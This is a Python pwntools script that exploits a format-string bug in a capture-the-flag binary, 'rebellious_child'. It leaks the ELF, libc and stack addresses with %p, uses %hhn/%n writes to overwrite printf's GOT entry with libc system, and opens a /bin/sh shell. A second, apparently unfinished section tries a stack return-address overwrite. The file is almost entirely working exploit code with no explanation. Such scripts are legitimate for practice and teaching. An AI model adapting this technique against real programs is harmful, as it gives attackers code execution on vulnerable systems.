#!/bin/env python3

from inspect import stack
from pwn import *

context.binary = elf = ELF('../challenge/rebellious_child')
context.terminal = ["tmux", "splitw", "-h"]

libc = ELF('/lib/libc.so.6')

# p = process()
p = elf.debug(gdbscript="""
b main
c
""")


p.sendafter(b'?\n', b'%15$p'.ljust(0xff, b'\x00'))
p.recvuntil(b'Welcome ')

elf.address = int(p.recvuntil(b'What').replace(
    b'What', b'').decode(), 16) - 0x11b0

info('elf.address: ' + hex(elf.address))


p.sendafter(b'?\n', b'%13$p'.ljust(0xff, b'\x00'))
p.recvuntil(b'Welcome ')

libc.address = int(p.recvuntil(b'What').replace(
    b'What', b'').decode(), 16) - 0x29290

info('libc.address: ' + hex(libc.address))

p.sendafter(b'?\n', b'%14$p'.ljust(0xff, b'\x00'))
p.recvuntil(b'Welcome ')

stack_address = int(p.recvuntil(b'What').replace(
    b'What', b'').decode(), 16)

info('stack_address: ' + hex(stack_address))

address_to_overwrite = elf.got['printf']

info('address_to_overwrite: ' + hex(address_to_overwrite))

for i, b in enumerate(pack(address_to_overwrite).ljust(8, b'\x00')):
    p.sendafter(
        b'?\n', f'%{(stack_address & 0xff) + 8 + i}c%14$hhn'.encode().ljust(0xff, b'\x00')
    )

    p.sendafter(
        b'?\n', f'{f"%{b}c" if b else ""}%44$hhn'.encode().ljust(0xff, b'\x00'))

p.sendafter(b'?\n', b'%45$p'.ljust(0xff, b'\x00'))
p.recvuntil(b'Welcome ')

overwrote_address = int(p.recvuntil(b'What').replace(
    b'What', b'').decode(), 16)

info('overwrote_address: ' + hex(overwrote_address))

p.sendafter(
    b'?\n', f'%{libc.symbols["system"] & 0xffffffff}c%45$n'.encode().ljust(0xff, b'\0'))

p.sendafter(b'?\n', b'/bin/sh'.ljust(0xff, b'\0'))

p.interactive()

# Trigger return

address_to_overwrite = stack_address - 0x114

info('address_to_overwrite: ' + hex(address_to_overwrite))

for i, b in enumerate(pack(address_to_overwrite).ljust(8, b'\x00')):
    p.sendafter(
        b'?\n', f'%{(stack_address & 0xff) + 8 + i}c%14$hhn'.encode().ljust(0xff, b'\x00')
    )

    p.sendafter(
        b'?\n', f'{f"%{b}c" if b else ""}%44$hhn'.encode().ljust(0xff, b'\x00'))

p.sendafter(b'?\n', b'%45$p'.ljust(0xff, b'\x00'))
p.recvuntil(b'Welcome ')

overwrote_address = int(p.recvuntil(b'What').replace(
    b'What', b'').decode(), 16)

info('overwrote_address: ' + hex(overwrote_address))

p.sendafter(
    # b'?\n', f'%{libc.symbols["system"] & 0xffff}c%45$hn'.encode().ljust(0xff, b'\0'))
    # b'?\n', f'%{0x4141}c%45$hn'.encode().ljust(0xff, b'\0'))
    b'?\n', b'%45$hn'.ljust(0xff, b'\0'))

p.interactive()
